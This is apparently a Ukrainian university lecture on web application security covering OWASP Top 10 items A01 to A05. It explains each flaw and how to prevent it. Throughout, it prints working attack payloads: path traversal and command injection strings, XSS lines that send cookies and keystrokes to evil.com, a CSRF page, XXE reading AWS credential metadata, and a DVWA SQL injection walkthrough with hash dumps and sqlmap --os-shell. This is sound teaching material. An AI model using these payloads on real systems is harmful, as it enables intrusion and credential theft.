Безпека веб-додатків: OWASP Top 10 (Частина 1)

2 год Нова

7.1 Вступ до безпеки веб-додатків

У попередніх лекціях ми вивчали безпеку на рівні мережі та операційних систем: сканування портів, експлуатацію мережевих сервісів, брутфорс паролів. Тепер ми переходимо до найпоширенішого вектора атак у сучасному світі — веб-додатків. Згідно зі звітом Verizon Data Breach Investigations Report (DBIR) 2024, веб-додатки залучені у 26% усіх підтверджених витоків даних, а 83% зломів здійснюються зовнішніми акторами, які використовують саме веб-вектор як первинну точку входу.

Причини популярності веб-атак очевидні: веб-додатки доступні з інтернету 24/7, мають складну логіку обробки даних, взаємодіють із базами даних та внутрішніми сервісами, а їхня поверхня атаки постійно зростає через мікросервісну архітектуру та REST/GraphQL API.

Протокол HTTP: фундамент веб-комунікації

HTTP (HyperText Transfer Protocol) — це протокол прикладного рівня, розроблений Тімом Бернерсом-Лі у 1991 році (HTTP/0.9). Поточні версії: HTTP/1.1 (RFC 2616, 1999), HTTP/2 (RFC 7540, 2015), HTTP/3 (RFC 9114, 2022, на базі QUIC/UDP). HTTP є stateless-протоколом — кожен запит незалежний, сервер не зберігає стан між запитами (для цього використовуються cookies та сесії).

HTTPS та TLS

HTTPS (HTTP Secure) — це HTTP поверх TLS (Transport Layer Security). TLS забезпечує три ключові властивості:

  • Конфіденційність — шифрування даних між клієнтом і сервером (AES-256-GCM, ChaCha20-Poly1305)
  • Цілісність — виявлення будь-якої модифікації даних у транзиті (HMAC, AEAD)
  • Автентичність — перевірка ідентичності сервера через X.509 сертифікат, підписаний довіреним CA
Параметр TLS 1.2 (2008) TLS 1.3 (2018, RFC 8446)
Handshake 2-RTT (2 round-trips) 1-RTT (+ 0-RTT resumption)
Cipher suites 37 підтримуваних (багато слабких) 5 сильних (TLS_AES_256_GCM_SHA384 та ін.)
Perfect Forward Secrecy Опціонально (ECDHE) Обов'язково для всіх з'єднань
Видалено у TLS 1.3 - RSA key exchange, RC4, DES, 3DES, MD5, SHA-1, CBC mode, static DH

Архітектура веб-додатку

Типова багаторівнева архітектура веб-додатку:

  1. Клієнт (браузер) — HTML/CSS/JavaScript, рендеринг UI, відправка HTTP-запитів
  2. Веб-сервер (Nginx / Apache) — прийом HTTP-запитів, статичні файли, reverse proxy, TLS-термінація
  3. Сервер додатку (PHP / Python / Node.js / Java / .NET) — бізнес-логіка, обробка даних, API
  4. База даних (MySQL / PostgreSQL / MongoDB) — зберігання та запити до даних
  5. Кеш (Redis / Memcached) — сесії, кеш відповідей, черги
  6. Зовнішні сервіси — платіжні системи, email (SMTP), CDN, cloud storage

Поверхня атаки веб-додатку

Рівень Вектори атак Приклади
Frontend (клієнт) XSS, Clickjacking, CSRF, DOM manipulation Впровадження скриптів, підміна UI, крадіжка cookies
Backend (сервер) SQLi, Command Injection, SSRF, SSTI, File Upload Виконання коду на сервері, доступ до БД
Інфраструктура Misconfiguration, exposed panels, default credentials Відкриті /admin, /phpmyadmin, debug mode
API Broken authentication, BOLA/IDOR, mass assignment Несанкціонований доступ через REST/GraphQL

Same-Origin Policy (SOP) та CORS

Same-Origin Policy (SOP) — фундаментальний механізм безпеки браузера, запроваджений Netscape у 1995 році. SOP забороняє скриптам одного origin читати дані іншого origin. Origin визначається трьома компонентами:

  • Протокол (http vs https — різні origins)
  • Хост (example.com vs api.example.com — різні origins)
  • Порт (example.com:80 vs example.com:8080 — різні origins)

CORS (Cross-Origin Resource Sharing) — контрольоване послаблення SOP. Сервер явно дозволяє певним origins доступ до своїх ресурсів через заголовки відповіді:

# Сервер дозволяє запити з конкретного origin
Access-Control-Allow-Origin: https://trusted-app.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true

# Preflight-запит (OPTIONS) — браузер автоматично надсилає
# перед cross-origin запитами з нестандартними методами або заголовками
OPTIONS /api/data HTTP/1.1
Origin: https://trusted-app.com
Access-Control-Request-Method: PUT

Cookies: управління сесіями

Оскільки HTTP є stateless, cookies використовуються для підтримки стану (сесії, автентифікація, персоналізація). Атрибути безпеки cookies:

Атрибут Призначення Рекомендація
HttpOnly Забороняє доступ із JavaScript (document.cookie) Завжди для сесійних cookies — захист від XSS
Secure Передається тільки через HTTPS Завжди — запобігає перехопленню у мережі
SameSite Контроль cross-site відправки cookie Strict або Lax — захист від CSRF-атак
Domain Домен, для якого cookie діє Максимально вузький scope
Path Шлях URL, для якого cookie діє Обмежити до необхідного шляху
Expires / Max-Age Час життя cookie Мінімально необхідний термін 
# Приклад безпечного Set-Cookie заголовка
Set-Cookie: sessionId=a1b2c3d4e5; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600

OWASP (Open Worldwide Application Security Project, до 2023 — Open Web Application Security Project) — це міжнародна некомерційна організація, присвячена покращенню безпеки програмного забезпечення. Заснована у 2001 році Марком Керфі (Mark Curphey), OWASP стала некомерційною організацією (501(c)(3)) у 2004 році. 7.3 A01: Порушення контролю доступу (Broken Access Control)

Контроль доступу (Access Control) — це механізм, який забезпечує, що користувачі можуть діяти лише в межах наданих їм повноважень. Порушення контролю доступу означає, що обмеження не дотримуються, і користувачі можуть виконувати дії або отримувати дані, на які не мають права.

У 2021 році ця категорія піднялась з позиції #5 на #1 — найкритичніший ризик. Статистика: 94% протестованих додатків мали форму порушення контролю доступу, з 318,000+ виявлених випадків та 34 пов'язаними CWE.

Ключові CWE

  • CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor
  • CWE-201 — Insertion of Sensitive Information Into Sent Data
  • CWE-284 — Improper Access Control
  • CWE-285 — Improper Authorization
  • CWE-352 — Cross-Site Request Forgery (CSRF)
  • CWE-639 — Authorization Bypass Through User-Controlled Key (IDOR)

IDOR (Insecure Direct Object Reference)

IDOR — одна з найпоширеніших вразливостей контролю доступу. Виникає, коли додаток використовує прямі посилання на внутрішні об'єкти (ID у базі даних) без перевірки повноважень поточного користувача.

# Нормальний запит — отримання свого профілю
GET /api/users/1001 HTTP/1.1
Cookie: session=user1001_token

# IDOR-атака — зміна ID для доступу до чужого профілю
GET /api/users/1002 HTTP/1.1
Cookie: session=user1001_token
# Сервер повертає дані користувача 1002 без перевірки!

# IDOR у POST-запиті — зміна чужого пароля
POST /api/users/1002/password HTTP/1.1
Cookie: session=user1001_token
Content-Type: application/json

{"new_password": "hacked123"}

Реальні випадки IDOR:

  • Facebook (2015) — дослідник виявив IDOR у Graph API, що дозволяв видаляти фото будь-якого користувача. Bug bounty: $12,500
  • US Army (2016) — IDOR на порталі дозволяв доступ до особових справ усіх військовослужбовців
  • Uber (2019) — IDOR в API дозволяв отримати поїздки будь-якого водія, включаючи GPS-координати

Вертикальна ескалація привілеїв

Користувач з обмеженими правами отримує доступ до функцій адміністратора:

# Прямий доступ до адмін-панелі без перевірки ролі
GET /admin/dashboard HTTP/1.1
Cookie: session=regular_user_token
# Відповідь: 200 OK — сторінка відображається!

# Маніпуляція роллю у тілі запиту
POST /api/users/register HTTP/1.1
Content-Type: application/json

{"username": "hacker", "password": "pass123", "role": "admin"}
# Сервер приймає role без серверної валідації!

# Маніпуляція JWT-токеном
# Оригінальний payload: {"sub":"1001","role":"user","exp":1700000000}
# Модифікований:        {"sub":"1001","role":"admin","exp":1700000000}
# Працює якщо сервер не валідує підпис або використовує слабкий secret

Горизонтальна ескалація привілеїв

Користувач А отримує доступ до даних або функцій користувача Б (того самого рівня привілеїв). Часто реалізується через IDOR на user-specific endpoints:

# Доступ до чужих замовлень
GET /api/orders/54321 HTTP/1.1
Authorization: Bearer user_A_token
# Замовлення 54321 належить user_B, але сервер не перевіряє ownership

# Доступ до чужих повідомлень
GET /api/messages?user_id=1002 HTTP/1.1
Cookie: session=user_1001

Path Traversal (Directory Traversal)

Маніпуляція шляхами файлів для доступу до файлів за межами дозволеної директорії:

# Базова атака
GET /download?file=../../../../etc/passwd HTTP/1.1

# URL-кодування для обходу фільтрів
GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1

# Подвійне кодування
GET /download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1

# Null byte injection (застарілі C-based системи)
GET /download?file=../../../../etc/passwd%00.jpg HTTP/1.1

# Windows-варіант
GET /download?file=..\..\..\..\windows\system32\config\sam HTTP/1.1

CORS Misconfiguration

Неправильна конфігурація CORS може дозволити зловмисному сайту читати дані з API від імені авторизованого користувача:

# НЕБЕЗПЕЧНО: дзеркальне відображення будь-якого Origin
Access-Control-Allow-Origin: https://evil.com   # Відображає будь-який Origin!
Access-Control-Allow-Credentials: true           # Дозволяє надсилати cookies!
# Результат: evil.com може читати дані авторизованого користувача

# НЕБЕЗПЕЧНО: wildcard
Access-Control-Allow-Origin: *

# ПРАВИЛЬНО: білий список origins
Access-Control-Allow-Origin: https://trusted-app.com
Access-Control-Allow-Credentials: true

JWT Token Manipulation

JSON Web Token (JWT) широко використовується для автентифікації в REST API. Типові атаки:

  • None Algorithm Attack: зміна алгоритму на "none" у заголовку JWT — якщо сервер не валідує алгоритм, токен приймається без підпису
  • Algorithm Confusion (RS256 → HS256): зміна асиметричного на симетричний алгоритм і підписання публічним ключем як shared secret
  • Weak Secret: brute-force секрету підпису (наприклад, "secret", "password123"). Інструменти: hashcat, jwt_tool
  • Payload Manipulation: зміна полів role, user_id, exp (expiration) у payload
# Структура JWT: header.payload.signature (Base64URL)
# eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIifQ.signature

# jwt_tool — інструмент для тестування JWT
python3 jwt_tool.py TOKEN -T              # Tampering — інтерактивна зміна
python3 jwt_tool.py TOKEN -X a            # None algorithm attack
python3 jwt_tool.py TOKEN -C -d wordlist.txt  # Crack secret

# hashcat — brute-force JWT secret
hashcat -m 16500 jwt_hash.txt wordlist.txt

CSRF (Cross-Site Request Forgery)

CSRF — атака, при якій зловмисний сайт виконує дію від імені автентифікованого користувача, використовуючи його активну сесію:

<!-- Зловмисна HTML-сторінка, яка змінює email жертви -->
<html>
<body onload="document.getElementById('csrf-form').submit();">
  <form id="csrf-form" action="https://bank.com/api/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
</body>
</html>

Запобігання: Broken Access Control

  • Deny by default: за замовчуванням забороняти доступ, явно дозволяти лише необхідне
  • Перевірка авторизації на кожному запиті: server-side, не довіряти клієнту
  • Серверні сесії: session ID у cookie (HttpOnly, Secure, SameSite), не в URL
  • Логування відмов доступу: alert на масові 403/401 з одного IP
  • Rate limiting: обмеження кількості запитів (429 Too Many Requests)
  • Disable directory listing: Nginx (autoindex off;), Apache (Options -Indexes)
  • Invalidate sessions on logout: серверне видалення сесії, не лише cookie
  • CSRF-токени: унікальний per-request або per-session токен
  • Autorize (Burp extension): автоматичне тестування контролю доступу

7.4 A02: Криптографічні збої (Cryptographic Failures)

Категорія перейменована з "Sensitive Data Exposure" (A03:2017) на "Cryptographic Failures", щоб зосередити увагу на кореневій причині — неправильному або відсутньому використанні криптографії — а не на наслідку (витік). Ключові CWE: CWE-259 (Use of Hard-coded Password), CWE-327 (Use of Broken Cryptographic Algorithm), CWE-331 (Insufficient Entropy).

Класифікація чутливих даних

Тип даних Приклади Регулятор / Стандарт
PII (Personally Identifiable Information) Ім'я, email, телефон, адреса, ІПН, паспорт GDPR (ЄС), CCPA (Каліфорнія)
PHI (Protected Health Information) Медичні записи, діагнози, рецепти HIPAA (США)
Фінансові дані Номери карток (PAN), CVV, банківські рахунки PCI DSS
Облікові дані Паролі, API-ключі, SSH-ключі, токени Внутрішні політики, SOC 2

Захист даних у транзиті (Data in Transit)

Усі дані між клієнтом та сервером повинні передаватись через TLS 1.2+ (рекомендовано TLS 1.3).

HSTS (HTTP Strict Transport Security) — заголовок, що змушує браузер завжди використовувати HTTPS:

# HSTS заголовок
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# max-age=31536000 — 1 рік (мінімально рекомендований)
# includeSubDomains — поширюється на піддомени
# preload — включення у preload list браузерів (hstspreload.org)

SSL Stripping Attack — атака, продемонстрована Moxie Marlinspike на Black Hat DC 2009. Зловмисник (MITM-позиція) перехоплює HTTP-редірект на HTTPS і підтримує незашифроване з'єднання з жертвою, одночасно встановлюючи HTTPS з сервером. Інструмент: sslstrip. Захист: HSTS з preload list.

Certificate Pinning — техніка для мобільних додатків: додаток зберігає хеш публічного ключа сервера і відхиляє з'єднання, якщо сертифікат змінився. Ускладнює MITM, але ускладнює ротацію сертифікатів.

Захист даних у спокої (Data at Rest)

Метод Технологія Застосування
Шифрування файлів AES-256-GCM, ChaCha20-Poly1305 Конфіденційні файли, бекапи
Full Disk Encryption LUKS (Linux), BitLocker (Windows), FileVault (macOS) Увесь диск сервера
TDE SQL Server TDE, Oracle TDE, MySQL InnoDB encryption Шифрування БД на рівні файлів (Transparent Data Encryption)
Column-level encryption Application-level AES, pgcrypto (PostgreSQL) Окремі стовпці з чутливими даними
Key Management HashiCorp Vault, AWS KMS, Azure Key Vault, HSM Зберігання та ротація ключів шифрування

Слабкі та зламані алгоритми

Алгоритм (слабкий) Проблема Безпечна заміна
MD5 Колізії знайдені у 2004 (Wang), практичні атаки з 2008 SHA-256, SHA-3, BLAKE2
SHA-1 SHAttered (2017, Google/CWI) — практична колізія SHA-256, SHA-384, SHA-512
DES 56-bit ключ — зламується за години на сучасному GPU AES-256

Зберігання паролів

Метод Безпека Коментар
Plaintext Найгірший Будь-який витік БД = всі паролі скомпрометовані
Reversible encryption (AES) Поганий Компрометація ключа = усі паролі. Паролі не потрібно розшифровувати
Unsalted hash (MD5/SHA) Недостатній Rainbow tables, precomputed lookups
Salted hash (SHA-256 + salt) Задовільний Захист від rainbow tables, але SHA-256 занадто швидкий для brute-force

Історичні криптографічні атаки

  • Heartbleed (CVE-2014-0160, CVSS 7.5): вразливість в OpenSSL — buffer over-read у TLS Heartbeat extension, дозволяла читати до 64 KB пам'яті сервера (приватні ключі, паролі, cookies). Вражено 17% TLS-серверів
  • POODLE (CVE-2014-3566): padding oracle атака на SSLv3 CBC — розшифровка по одному байту за 256 запитів. Результат: SSLv3 повністю заборонений
  • BEAST (2011): атака на TLS 1.0 CBC — передбачуваний вибір IV
  • CRIME (2012): експлуатація TLS-компресії — визначення cookies за розміром стиснутих даних
  • DROWN (CVE-2016-0800): наявність SSLv2 на сервері дозволяє розшифровку TLS-сесій
  • SHAttered (2017): Google та CWI Amsterdam створили два різних PDF з однаковим SHA-1 хешем. Вартість: ~$110,000 GPU

Запобігання: Cryptographic Failures

  • Класифікувати дані за чутливістю, застосовувати відповідний захист
  • Не зберігати чутливі дані без потреби — мінімізація даних (GDPR principle)
  • Шифрувати усі дані в транзиті (TLS 1.2+) та в спокої (AES-256)
  • Використовувати HSTS з preload для примусового HTTPS
  • Паролі хешувати через bcrypt (cost ≥ 12) або Argon2id
  • Не використовувати ECB mode, MD5, SHA-1, DES, RC4
  • Ключі зберігати у Vault/KMS, ніколи у коді чи конфігураційних файлах

7.5 A03: Ін'єкції (Injection)

Ін'єкція — це клас вразливостей, при яких ненадійні (untrusted) дані від користувача надсилаються до інтерпретатора як частина команди або запиту. Атакуючий може виконати несанкціоновані команди або отримати доступ до даних без належної авторизації.

У 2021 році Injection впала з позиції #1 на #3 (завдяки поширенню ORM та параметризованих запитів), але тепер включає XSS (раніше окрема категорія A07:2017). Статистика: 33 CWE, 274,000+ випадків.

SQL Injection (CWE-89)

SQL Injection (SQLi) — найвідоміший тип ін'єкції. Виникає, коли додаток конструює SQL-запити шляхом конкатенації рядків із даними користувача:

# Вразливий PHP-код
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'
          AND password = '" . $_POST['password'] . "'";
$result = mysqli_query($conn, $query);

# Якщо username = admin' --
# Результат SQL:
# SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''
# Коментар -- ігнорує перевірку пароля!

Типи SQL Injection

Тип Механізм Видимість даних Швидкість
Error-based Дані витікають через повідомлення про помилки СУБД Пряма (в error message) Швидко
UNION-based UNION SELECT додає рядки з іншої таблиці Пряма (на сторінці) Швидко
Blind Boolean Різна поведінка додатку (true/false) залежно від умови Непряма (по символу) Повільно
Blind Time-based SLEEP()/BENCHMARK() — затримка відповіді як індикатор Непряма (по символу) Дуже повільно
Second-order Payload зберігається у БД, спрацьовує при пізнішому використанні Непряма Варіюється
Out-of-Band (OOB) Дані надсилаються через DNS/HTTP (LOAD_FILE, UTL_HTTP) Через інший канал Швидко

Command Injection (CWE-78)

Виникає, коли додаток виконує системні команди з використанням даних користувача:

# Вразливий PHP-код
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);

# Атака через shell metacharacters:
# ?ip=8.8.8.8; cat /etc/passwd
# ?ip=8.8.8.8 | whoami
# ?ip=8.8.8.8 && id
# ?ip=8.8.8.8 || ls -la /
# ?ip=$(whoami)
# ?ip=`id`

# Вразливий Python-код
import os
domain = input("Enter domain: ")
os.system("nslookup " + domain)        # НЕБЕЗПЕЧНО!

# Безпечна альтернатива
import subprocess
subprocess.run(["nslookup", domain], shell=False)  # shell=False!

XSS — Cross-Site Scripting (CWE-79)

XSS — ін'єкція шкідливого JavaScript-коду у веб-сторінки. У 2021 класифікується як підтип Injection.

Тип XSS Збереження Вектор Приклад
Reflected (Type 1) Ні — payload у URL Користувач клікає шкідливе посилання Пошукова сторінка, error messages
Stored (Type 2) Так — у БД сервера Виконується для всіх відвідувачів Коментарі, профілі, форуми
DOM-based (Type 0) Ні — клієнтський JS Маніпуляція DOM без серверної взаємодії document.location, innerHTML, eval() 
# Типові XSS payload'и
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>

# Session hijacking через XSS
<script>
  new Image().src = "https://evil.com/steal?c=" + document.cookie;
</script>

# Keylogger через XSS
<script>
  document.addEventListener('keypress', function(e) {
    new Image().src = "https://evil.com/log?k=" + e.key;
  });
</script>

Вплив XSS: крадіжка сесійних cookies, keylogging, підміна вмісту сторінки (defacement), фішинг, майнінг криптовалюти у браузері жертви, розповсюдження малварі.

Інші типи ін'єкцій

  • LDAP Injection (CWE-90): модифікація LDAP-запитів. Payload: *)(uid=*))(|(uid=*
  • NoSQL Injection: MongoDB оператори $gt, $ne, $regex. Приклад: {"username":"admin","password":{"$ne":""}} — bypass автентифікації
  • SSTI (Server-Side Template Injection): ін'єкція у шаблонізатори. Тест: {{7*7}} (Jinja2 → 49), ${7*7} (FreeMarker). Може привести до RCE

Запобігання: Injection

  • Параметризовані запити (Prepared Statements) — єдиний надійний захист від SQLi
  • Input validation: whitelist — дозволяти лише очікувані символи та формати
  • Output encoding: HTML-encode, JavaScript-encode, URL-encode залежно від контексту
  • ORM: Django ORM, SQLAlchemy, Hibernate — абстрагують від SQL
  • WAF: ModSecurity + OWASP CRS, Cloudflare WAF, AWS WAF
  • Least privilege: DB-користувач без DROP/ALTER/FILE привілеїв
  • CSP (Content Security Policy): заголовок для обмеження джерел скриптів
# Prepared Statements — приклади різними мовами

# Python (MySQL Connector)
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s",
               (username, password))

# PHP (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :user AND password = :pass");
$stmt->execute(['user' => $username, 'pass' => $password]);

# Java (JDBC)
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?");
ps.setString(1, username);
ps.setString(2, password);

# Node.js (mysql2)
const [rows] = await pool.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    [username, password]);

7.6 SQL Injection: практика

У цьому розділі ми розглянемо практичне виявлення та експлуатацію SQL Injection — від ручного тестування до автоматизації за допомогою SQLMap. Як навчальну платформу використаємо DVWA (Damn Vulnerable Web Application).

Крок 1: Пошук точки ін'єкції

# Тест одинарною лапкою — класичний маркер
Введення: '
Очікувана відповідь: SQL error — "You have an error in your SQL syntax..."

# Boolean тест
Введення: 1' AND '1'='1    # TRUE — нормальний результат
Введення: 1' AND '1'='2    # FALSE — порожній результат
# Якщо різна поведінка — параметр вразливий

# Числовий параметр
Введення: 1 AND 1=1         # TRUE
Введення: 1 AND 1=2         # FALSE

# Time-based тест
Введення: 1' AND SLEEP(5) --    # Затримка 5 секунд?

Крок 2: Визначення кількості стовпців

# Метод ORDER BY — інкрементуємо до помилки
1' ORDER BY 1 --     # OK
1' ORDER BY 2 --     # OK
1' ORDER BY 3 --     # ERROR: "Unknown column '3' in 'order clause'"
# Отже, запит повертає 2 стовпці

# Метод UNION SELECT NULL
1' UNION SELECT NULL --           # ERROR (недостатньо стовпців)
1' UNION SELECT NULL,NULL --      # OK — 2 стовпці

Крок 3: Знаходження відображуваних стовпців

# Використовуємо неіснуючий id для очищення оригінального виводу
-1' UNION SELECT 1,2 --
# На сторінці відображаються числа "1" та "2"
# Тепер знаємо, які позиції виводяться на сторінку

Крок 4: Enumeration бази даних

# Версія СУБД, поточна база, поточний користувач
-1' UNION SELECT version(),database() --
# Результат: 5.7.33-0ubuntu0.16.04.1 | dvwa

-1' UNION SELECT user(),@@datadir --
# Результат: root@localhost | /var/lib/mysql/

Крок 5: Enumeration таблиць

# Список усіх таблиць поточної бази
-1' UNION SELECT group_concat(table_name),2
    FROM information_schema.tables WHERE table_schema=database() --
# Результат: guestbook,users

Крок 6: Enumeration стовпців

# Стовпці таблиці users
-1' UNION SELECT group_concat(column_name),2
    FROM information_schema.columns WHERE table_name='users' --
# Результат: user_id,first_name,last_name,user,password,avatar,last_login,failed_login

Крок 7: Вилучення даних

# Дамп логінів та паролів
-1' UNION SELECT group_concat(user,0x3a,password SEPARATOR 0x0a),2 FROM users --
# Результат:
# admin:5f4dcc3b5aa765d61d8327deb882cf99
# gordonb:e99a18c428cb38d5f260853678922e03
# 1337:8d3533d75ae2c3966d7e0d4fcc69216b
# pablo:0d107d09f5bbe40cade3de5c71e9e9b7
# smithy:5f4dcc3b5aa765d61d8327deb882cf99

# Хеші MD5, розшифровуються миттєво:
# admin:password, gordonb:abc123, pablo:letmein, smithy:password

Blind SQLi: Boolean-based

# Посимвольне вилучення назви бази даних
1' AND SUBSTRING(database(),1,1)='d' --    # TRUE
1' AND SUBSTRING(database(),2,1)='v' --    # TRUE
1' AND SUBSTRING(database(),3,1)='w' --    # TRUE
1' AND SUBSTRING(database(),4,1)='a' --    # TRUE
# database() = 'dvwa'

# Бінарний пошук ASCII для прискорення (8 запитів замість 256)
1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)) > 64 --
1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)) > 96 --

Blind SQLi: Time-based

# Використовується коли немає жодної видимої різниці у відповіді
1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(3), 0) --
# Затримка 3 секунди = символ вгадано

# PostgreSQL
1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --

# MS SQL
1'; WAITFOR DELAY '00:00:05' --

SQLMap: автоматизація

SQLMap — найпотужніший open-source інструмент для автоматичного виявлення та експлуатації SQL Injection. Підтримує MySQL, PostgreSQL, Oracle, MS SQL, SQLite та інші.

# Базове сканування
sqlmap -u "http://target.com/page?id=1" --dbs

# З cookie (автентифікована сторінка)
sqlmap -u "http://target.com/page?id=1" \
  --cookie="PHPSESSID=abc123; security=low" --dbs

# POST-запит
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test" --dbs

# Повний pipeline вилучення даних
sqlmap -u "http://target.com/page?id=1" --dbs                         # Бази
sqlmap -u "http://target.com/page?id=1" -D dvwa --tables              # Таблиці
sqlmap -u "http://target.com/page?id=1" -D dvwa -T users --columns    # Стовпці
sqlmap -u "http://target.com/page?id=1" -D dvwa -T users \
  -C user,password --dump                                              # Дамп

# Агресивне сканування (обхід фільтрів)
sqlmap -u "http://target.com/page?id=1" --risk=3 --level=5

# Tamper-скрипти для обходу WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,charencode

# OS shell (потрібен FILE привілей + запис у webroot)
sqlmap -u "http://target.com/page?id=1" --os-shell

# Читання файлів сервера
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# Crawling для пошуку injection points
sqlmap -u "http://target.com/" --crawl=2 --forms --batch

Захист від SQL Injection: приклади коду

# Python — параметризовані запити (БЕЗПЕЧНО)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# PHP PDO — prepared statements (БЕЗПЕЧНО)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);

# Java JDBC — PreparedStatement (БЕЗПЕЧНО)
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, userId);

# Node.js mysql2 — placeholders (БЕЗПЕЧНО)
const [rows] = await pool.execute("SELECT * FROM users WHERE id = ?", [userId]);

# Django ORM — автоматична параметризація (БЕЗПЕЧНО)
User.objects.filter(id=user_id)

# НЕБЕЗПЕЧНИЙ підхід (НІКОЛИ так не робіть!)
query = f"SELECT * FROM users WHERE id = {user_id}"         # Python f-string
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];   // PHP concat

7.7 A04-A05: Небезпечний дизайн та помилки конфігурації

A04: Insecure Design (Небезпечний дизайн)

Insecure Design — нова категорія у 2021, що фокусується на архітектурних та проєктних недоліках, а не на помилках реалізації. Навіть ідеальна реалізація небезпечного дизайну залишається вразливою. CWE: CWE-209 (Error Info Exposure), CWE-256 (Plaintext Storage), CWE-501 (Trust Boundary Violation), CWE-522 (Insufficiently Protected Credentials).

Моделювання загроз (Threat Modeling)

Методологія Розробник Підхід
STRIDE Microsoft Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege
PASTA Tony UcedaVelez 7-етапний ризик-орієнтований Process for Attack Simulation and Threat Analysis
DREAD Microsoft (legacy) Damage, Reproducibility, Exploitability, Affected users, Discoverability

Принципи безпечного дизайну

  • Defense in Depth: кілька рівнів захисту — компрометація одного не означає повний злом
  • Fail Secure: при збої система переходить у безпечний стан (deny), не в відкритий (allow)
  • Least Privilege: мінімальні необхідні права для кожного компонента та користувача
  • Separation of Concerns: розділення бізнес-логіки, автентифікації, авторизації, логування
  • Zero Trust: "ніколи не довіряй, завжди перевіряй" — автентифікація на кожному кроці
  • Abuse Cases: моделювання сценаріїв зловживання паралельно з use cases

Приклади небезпечного дизайну

  • Необмежений password reset: без rate limiting — перебір 4-6 цифрового OTP (10,000-1,000,000 варіантів). Рішення: rate limiting + lockout після N спроб + збільшення довжини OTP
  • Security questions: "Дівоче прізвище матері" — знаходиться через OSINT. Рішення: не використовувати, замінити на MFA
  • Токени у URL: токени скидання пароля у GET-параметрах потрапляють у логи, Referer, історію браузера

A05: Security Misconfiguration (Помилки конфігурації)

Піднялась з #6 на #5, тепер включає XXE (раніше окрема A04:2017). 90% додатків мали misconfiguration.

Типові помилки конфігурації

Проблема Приклад Ризик
Default credentials admin/admin, tomcat/tomcat, root/toor Повний адмін-доступ
Debug mode у production Django DEBUG=True, Flask debug, PHP display_errors Stack traces, внутрішні шляхи
Directory listing Apache Options +Indexes, Nginx autoindex on Перегляд усіх файлів директорії
Sample applications Tomcat /examples, IIS sample pages Відомі вразливості
Verbose errors SQL syntax error з повним запитом Information disclosure
Unnecessary services phpMyAdmin відкритий в інтернеті Додатковий вектор атаки

Security Headers

Заголовок Рекомендоване значення Захист від

XXE (XML External Entity)

XXE — атака на парсери XML, що дозволяють обробку зовнішніх сутностей. У 2021 — підтип Security Misconfiguration.

<!-- Читання файлу через XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<userInfo>
  <name>&xxe;</name>
</userInfo>

<!-- SSRF через XXE — доступ до AWS metadata -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>

<!-- Billion Laughs DoS -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... 9 рівнів = 10^9 символів у пам'яті -->
]>
<root>&lol9;</root>

Запобігання XXE:

  • Вимкнути DTD processing та зовнішні сутності у XML-парсерах
  • Використовувати JSON замість XML де можливо
  • Оновлювати XML-бібліотеки
# Python — безпечний XML parsing
import defusedxml.ElementTree as ET
tree = ET.parse('data.xml')

# Java — вимкнення DTD
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

# PHP — вимкнення зовнішніх сутностей
libxml_disable_entity_loader(true);

Cloud Misconfiguration

  • AWS S3: публічні бакети з чутливими даними. Інструменти: aws s3 ls s3://bucket --no-sign-request, S3Scanner
  • Azure Blob Storage: публічні контейнери. MicroBurst для enumeration
  • GCP: публічні Cloud Storage бакети, відкриті Firebase бази
  • Shodan / Censys: пошукові рушії для misconfigured серверів та IoT-пристроїв

Запобігання: Security Misconfiguration

  • Hardened baseline: CIS Benchmarks для кожної платформи
  • Мінімальна платформа: видалити непотрібні компоненти та документацію
  • Регулярний аудит конфігурацій та оновлень
  • Сегментована архітектура: ізоляція компонентів
  • Автоматичне сканування: ScoutSuite (cloud), Prowler (AWS), Checkov (IaC)
  • Infrastructure as Code: Terraform, Ansible — відтворювані конфігурації

